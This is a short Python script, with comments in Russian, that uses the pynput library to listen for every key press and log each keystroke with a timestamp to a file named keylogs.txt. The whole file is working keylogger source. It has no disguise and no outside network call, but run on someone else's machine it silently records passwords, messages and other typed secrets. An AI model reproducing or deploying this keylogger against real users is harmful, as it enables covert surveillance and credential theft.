
from pynput.keyboard import Key, Listener
import logging

# Задает создание FileHandler с использованием указанного имени файла
# установка уровеня корневого регистратора на указанный уровень
# форматирование строки для обработчика 



log_dir = ""
logging.basicConfig(filename=(log_dir + "keylogs.txt"), 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


